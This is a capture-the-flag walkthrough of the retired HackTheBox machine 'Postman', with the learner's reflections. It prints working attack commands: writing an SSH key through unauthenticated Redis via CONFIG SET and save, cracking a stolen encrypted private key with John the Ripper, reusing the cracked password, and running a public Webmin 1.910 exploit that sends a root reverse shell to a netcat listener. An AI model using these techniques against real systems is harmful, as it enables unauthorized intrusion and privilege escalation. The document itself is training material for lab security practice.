# Postman - HackTheBox Retired Machine

**Date:** 2026-06-29
**Difficulty:** Easy
**OS:** Linux
**Category:** Misconfiguration / Database
**Status:** Complete

---

## Summary

Postman runs on an unauthenticated Redis instance that allows writing arbitrary file content anywhere the Redis process can reach, including a user's `.ssh` directory. Writing an attacker-controlled SSH public key into that directory grants direct SSH access as the `redis` user. From there, an encrypted SSH private key found on disk cracks offline to a password that also works for switching to a second local user. That user has a valid login for an outdated Webmin installation, which is vulnerable to a known, named exploit that returns a root shell directly. The interesting part of this machine is recognizing how far an unauthenticated database service can reach into the filesystem once arbitrary file writes are possible, well beyond the data the database itself was meant to store.

---

## Reconnaissance

### Port Scan

```
nmap -sS -sV -sC -p- --min-rate 5000 -T4 -oN 20260629075945_scan_tcp.nmap 10.129.2.1
```

**Open ports:**
- 22/tcp: ssh, OpenSSH 7.6p1 Ubuntu
- 80/tcp: http, Apache httpd 2.4.29, "The Cyber Geek's Personal Website"
- 6379/tcp: redis, Redis key-value store 4.0.9
- 10000/tcp: http, MiniServ 1.910 (Webmin httpd)

**Initial observations:**

Four open ports gave four directions to consider. Port 80 served a static personal site with nothing pointing toward a deeper application. Port 6379, an exposed Redis instance, stood out immediately as worth checking for authentication, since Redis has no authentication enabled by default and this is a well known, common misconfiguration. Port 10000 identified itself directly as Webmin, a web-based system administration panel, which was worth keeping in mind as a privilege escalation target once any kind of access was established, since Webmin runs with significant system-level privilege by design.

---

## Enumeration

Connecting to Redis directly with no credentials succeeded immediately, confirming the service ran without authentication.

```
redis-cli -h 10.129.2.1
```

With a connection open but no prior experience using Redis interactively, the built-in help system was used directly to find the relevant configuration commands, instead of guessing at syntax.

```
10.129.2.1:6379> help CONFIG
10.129.2.1:6379> help CONFIG GET
```

```
10.129.2.1:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
```

`CONFIG GET dir` returned the working directory Redis uses when persisting its data to disk, `/var/lib/redis`. This is also the home directory for a `redis` system user, and from this point the goal was to reach that user's `.ssh` directory through Redis's own file-writing capability, specifically to drop in an SSH key Redis itself had no reason to know anything about.

The official write-up was consulted for this specific step. Knowing that `/var/lib/redis/.ssh` was worth attempting directly, well ahead of any output Redis itself had provided pointing there came from outside reasoning.

```
10.129.2.1:6379> CONFIG SET dir /var/lib/redis/somedir
(error) ERR Changing directory: No such file or directory
10.129.2.1:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
```

The first attempt against a nonexistent directory returned an error, while the `.ssh` attempt returned `OK`, confirming the directory existed and that Redis had permission to write there.

---

## Exploitation

### Writing an SSH key through Redis

With `dir` pointed at the target `.ssh` folder, the next step was getting a public key into Redis as a value, then telling Redis to save its in-memory data directly to a file named `authorized_keys` in that directory.

```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
```

The leading and trailing newlines around the key were added deliberately, since Redis's RDB file format wraps stored values with its own binary framing, and padding the key with blank lines helps ensure the eventual `authorized_keys` file still parses the public key correctly even with that extra framing data sitting immediately before and after it.

```
10.129.2.1:6379> GET ssh_key
10.129.2.1:6379> CONFIG SET dbfilename authorized_keys
OK
10.129.2.1:6379> save
OK
```

`save` triggers Redis to write its current dataset to disk using the configured `dir` and `dbfilename`, which together pointed the write at `/var/lib/redis/.ssh/authorized_keys`. This is the same persistence mechanism Redis normally uses to survive a restart, repurposed here to plant a file with attacker-chosen content in an attacker-chosen location.

```
ssh redis@10.129.2.1
redis@Postman:~$ id -a
uid=107(redis) gid=114(redis) groups=114(redis)
```

The SSH key authenticated successfully, giving a shell as the `redis` system user.

---

## Post-Exploitation / Privilege Escalation

### Automated enumeration and a private key on disk

linpeas was transferred to the box and run directly to get a broad first pass over the system.

```
scp linpeas.sh redis@10.129.2.1:/tmp/
redis@Postman:/tmp$ chmod +x linpeas.sh
redis@Postman:/tmp$ ./linpeas.sh
```

Among its output, linpeas flagged an encrypted private key at `/opt/id_rsa.bak`, found under its scan for SSH and SSL-related files.

```
redis@Postman:/tmp$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
```

The `Proc-Type: 4,ENCRYPTED` header confirmed the key required a passphrase before it could be used. The file was copied to the attacking machine for offline cracking.

```
scp redis@10.129.2.1:/opt/id_rsa.bak id_rsa.bak
```

### Cracking the key and pivoting to a second user

As with the Craft engagement, a format-specific John the Ripper helper script was needed before the key itself could be cracked.

```
python3 /opt/john/run/ssh2john.py id_rsa.bak > hash.txt
/opt/john/run/john hash.txt --fork=4 -w=/opt/wordlists/rockyou.txt
```

```
computer2008     (id_rsa.bak)
```

John recovered the passphrase `computer2008` directly from the rockyou wordlist. Instead of using the cracked key directly over SSH, the same password was tried against `su` for the box's other local user, `Matt`, identified earlier from `/etc/passwd` entries surfaced by linpeas.

```
redis@Postman:/tmp$ su - Matt
Password:
Matt@Postman:~$ id -a
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
```

This succeeded, confirming the cracked passphrase was reused as Matt's actual login password, well beyond being specific to the key file alone. The user flag was retrieved from `Matt`'s home directory.

A check of `sudo -l` as `Matt` returned a direct denial, ruling out sudo-based privilege escalation entirely and narrowing the remaining path toward whatever else this user had access to.

```
Matt@Postman:~$ sudo -l
Sorry, user Matt may not run sudo on Postman.
```

### Identifying and exploiting Webmin

Port 10000 had already been identified during initial recon as Webmin. With a second user's credentials now in hand, the natural next step was checking whether those credentials worked against that panel, given that credential reuse had already paid off once on this same box.

```
Matt@Postman:~$ dpkg -l | grep -i webmin
ii  webmin    1.910    all    web-based administration interface for Unix systems
```

The installed version, 1.910, is specific enough to search directly for known vulnerabilities against. The official write-up was consulted from this point forward for the remainder of the path. Confirming this exact version as the basis for a known, named exploit, and identifying which public proof-of-concept implements it, both came from that write-up directly.

A public exploit script targeting Webmin 1.910's package update functionality (StealthByte0/Webmin-1.910-Exploit-Script) was used directly, authenticating with Matt's credentials and pointing it at a local listener.

```
python3 webmin_exploit.py --rhost 10.129.2.1 --lhost 10.10.15.97 -u Matt -p computer2008 -s True --lport 4444
```

```
nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.15.97] from (UNKNOWN) [10.129.2.1] 48134
id
uid=0(root) gid=0(root) groups=0(root)
```

The connection landed as `root` directly, with no further privilege escalation step needed, since the underlying Webmin vulnerability runs its injected command with the same privilege the Webmin service itself holds, which on this box was root. The root flag was retrieved from `/root/root.txt`.

---

## Flags

- User flag: retrieved
- Root flag: retrieved

---

## What I Learned

- An exposed Redis instance with no authentication is a direct route to arbitrary file writes anywhere the Redis process has filesystem permission, well beyond the key-value data it is meant to store. `CONFIG SET dir` combined with `CONFIG SET dbfilename` and `save` together amount to a controlled file write primitive.
- Redis's interactive `help` command, used directly against an unfamiliar command family, is a fast way to confirm exact syntax without needing to leave the session or consult external documentation first.
- A cracked credential should be tried against every local account already known to exist, beyond just the account or file it was originally found attached to. The same passphrase that decrypted a private key also worked as a different user's actual login password.
- A `sudo -l` denial closes off one specific privilege escalation path cleanly and immediately. It is worth checking early specifically to rule that path out, freeing attention for other angles right away.
- A specific, named software version (Webmin 1.910 here, confirmed directly through `dpkg -l`) is worth searching against public exploit databases as a matter of habit.

---

## What I Would Do Differently

- I referred to the official write-up for the `.ssh` directory insight. Without prior exposure to this specific Redis exploitation pattern, there was no way to land on `/var/lib/redis/.ssh` as the target directory through reasoning alone. Knowing the default Redis data directory lines up with a real user's home directory, and that this specific combination is exploitable, is product-specific knowledge that needed to be looked up.
- From the Webmin version identification onward, I referred to the official write-up again. Confirming the right named exploit for that exact version, and using the specific public proof-of-concept tool, sits squarely in lookup territory. No amount of reasoning from first principles gets there.
- The parts that did run independently, recognizing unauthenticated Redis as worth investigating, finding `CONFIG GET dir`, the credential reuse step at `su Matt`, and the early `sudo -l` check, would generalize well to a new box. The two named-technique gaps would not, and are worth deliberately building exposure to ahead of time, instead of re-discovering them live each time.

---

## References

- [Redis CONFIG command documentation](https://redis.io/commands/config-set/) - referenced through the built-in `help` system for `CONFIG GET` and `CONFIG SET` syntax
- A known Redis unauthenticated file-write technique (Redis versions 4.0 to 5.0 lacking authentication by default) - consulted via the official write-up for the specific `.ssh` directory target
- [John the Ripper](https://www.openwall.com/john/) and its `ssh2john.py` helper - used to extract and crack the encrypted private key's passphrase
- [StealthByte0/Webmin-1.910-Exploit-Script](https://github.com/StealthByte0/Webmin-1.910-Exploit-Script) - public exploit used for the final root shell, targeting Webmin 1.910's package update command injection
- HTB official write-up for Postman: https://app.hackthebox.com/starting-point (navigate to Postman write-up) - consulted for the Redis `.ssh` directory target and for the Webmin version-to-exploit identification
